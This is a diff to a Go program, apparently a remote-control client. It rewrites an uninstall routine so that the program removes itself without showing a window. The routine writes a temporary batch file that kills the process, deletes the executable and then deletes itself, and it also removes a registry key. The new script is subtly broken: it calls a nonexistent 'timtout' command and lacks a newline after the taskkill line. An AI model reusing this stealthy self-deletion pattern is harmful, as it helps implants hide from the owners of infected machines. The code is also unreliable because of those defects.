@@ -6,8 +6,12 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
+	"strconv"
 	"syscall"
+
+	"golang.org/x/sys/windows/registry"
 )
 
 func remote_execute(path string, hidden bool, args ...string) bool {
@@ -84,11 +88,22 @@ func kill(name string) bool {
 	return ret != 0
 }
 
-// TODO: It has bugs
-func uinstall() {
+func uninstall() {
 	_ = os.Chdir(os.TempDir())
-	str := `ping 127.0.0.1 -n 3 > nul && del /f /q "` + get_module_file() + `"`
-	cmd := exec.Command("cmd", "/C", str)
+	script := "@echo off\n" +
+		"chcp 65001\n" +
+		"timtout /t 1 /nobreak\n" +
+		"taskkill /f /pid " + strconv.FormatInt(int64(os.Getpid()), 10) + " /t" +
+		"timtout /t 1 /nobreak\n" +
+		"del /f /q \"" + get_module_file() + "\"\n" +
+		"timtout /t 2 /nobreak\n" +
+		"del /f /q %0"
+	path := filepath.Join(os.TempDir(), random_string(8)+".bat")
+	if err := os.WriteFile(path, []byte(script), 0644); err != nil {
+		os.Exit(0)
+	}
+	reg_delete_key(registry.CURRENT_USER, g_regpath)
+	cmd := exec.Command("cmd", "/C", path)
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	if err := cmd.Start(); err != nil {
 		return
